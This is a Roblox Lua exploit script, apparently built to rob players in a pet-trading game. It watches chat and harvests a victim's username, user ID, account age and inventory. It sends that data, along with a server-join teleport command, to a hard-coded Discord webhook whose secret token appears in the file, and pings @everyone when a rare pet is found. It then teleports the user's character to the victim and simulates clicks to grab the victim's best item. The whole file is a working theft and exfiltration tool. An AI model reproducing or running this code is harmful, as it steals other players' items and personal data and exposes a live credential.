local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"

local RARE_PETS = {
    ["T-Rex"] = true,
    ["Dragonfly"] = true,
    ["Raccoon"] = true,
    ["Mimic Octopus"] = true,
    ["Butterfly"] = true,
    ["Disco bee"] = true,
    ["Queen bee"] = true
}

local function mouse1click()
    local mouse = LocalPlayer:GetMouse()
    for _,v in next, getconnections(mouse.Button1Down) do
        v:Fire()
    end
end

local function sendToWebhook(data)
    local success, placeId = pcall(function() return game.PlaceId end)
    local success2, jobId = pcall(function() return game.JobId end)
    
    local teleportScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("
    ..(success and tostring(placeId) or "nil")..", "
    ..(success2 and ("'"..jobId.."'") or "nil")..")"

    local itemsText = data.items or "No items found"
    local hasRarePet = false
    
    for petName in pairs(RARE_PETS) do
        if string.find(itemsText, petName) then
            hasRarePet = true
            break
        end
    end

    local embed = {
        ["title"] = "Roqate - 2025",
        ["description"] = "Target Information",
        ["color"] = 0xFF0000,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = data.username or "N/A",
                ["inline"] = true
            },
            {
                ["name"] = "UserID",
                ["value"] = tostring(data.userId or "N/A"),
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = tostring(data.accountAge or "N/A"),
                ["inline"] = true
            },
            {
                ["name"] = "Items",
                ["value"] = itemsText,
                ["inline"] = false
            }
        }
    }

    local payload = {
        ["content"] = (hasRarePet and "@everyone\n" or "")..teleportScript,
        ["embeds"] = {embed}
    }

    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

local function getBestItem(backpack)
    local bestItem = nil
    local bestValue = 0
    local bestWeight = 0
    local isPet = false

    for _, tool in ipairs(backpack:GetChildren()) do
        local itemName = tool.Name
        local petMatch = string.match(itemName, "([%w%s]+) %[%d+%.%d+ KG%] %[Age %d+%]")
        local itemMatch = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")

        if petMatch then
            local petName = petMatch
            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+) KG%]")) or 0
            local rarityValue = RARE_PETS[petName] and 1000 or 100

            if rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = tool
                isPet = true
            end
        elseif itemMatch then
            local rarity, name = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+)kg%]")) or 0
            local rarityValue = 0

            if rarity == "Disco" then rarityValue = 50
            elseif rarity == "Wet" then rarityValue = 40
            else rarityValue = 10 end

            if not isPet and (rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight)) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = tool
            end
        end
    end

    return bestItem
end

local function teleportAndInteract(target)
    local character = LocalPlayer.Character
    if not character then
        character = LocalPlayer.CharacterAdded:Wait()
    end
    
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    humanoid.CameraOffset = Vector3.new(0, 0, 0)
    humanoid.AutoRotate = false

    local targetCharacter = target.Character
    if not targetCharacter then
        targetCharacter = target.CharacterAdded:Wait()
    end
    
    local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")
    if not targetTorso then
        targetTorso = targetCharacter:WaitForChild("UpperTorso", 5) or targetCharacter:WaitForChild("Torso", 5)
        if not targetTorso then return end
    end

    rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
    humanoid.CameraOffset = Vector3.new(0, 0, 0)

    local conn
    conn = RunService.Heartbeat:Connect(function()
        if targetCharacter and targetTorso and rootPart then
            rootPart.CFrame = CFrame.new(rootPart.Position, targetTorso.Position) * CFrame.new(0, 0, -4)
        else
            if conn then conn:Disconnect() end
        end
    end)

    local backpack = target:FindFirstChild("Backpack")
    if backpack then
        local bestItem = getBestItem(backpack)
        if bestItem and targetCharacter:FindFirstChild("Humanoid") then
            targetCharacter.Humanoid:EquipTool(bestItem)
        end
    end

    task.wait(0.5)
    local screenPos = Vector2.new(0.5, 0.5)
    pcall(function()
        UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
        mouse1click()
    end)
    
    task.wait(5)
    if conn then conn:Disconnect() end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer then return end
    if not string.find(message, "@") then return end

    -- Get player items
    local items = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            table.insert(items, tool.Name)
        end
    end

    -- Send webhook data
    local data = {
        username = player.Name,
        userId = player.UserId,
        accountAge = player.AccountAge,
        items = #items > 0 and table.concat(items, "\n") or "No items found"
    }
    
    sendToWebhook(data)
    
    -- Teleport and interact
    local success, err = pcall(function()
        teleportAndInteract(player)
    end)
    
    if not success then
        warn("Error during teleport/interact: "..err)
    end
end

-- Connect chat listeners
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(message)
            onPlayerChatted(player, message)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(message)
            onPlayerChatted(player, message)
        end)
    end
end)
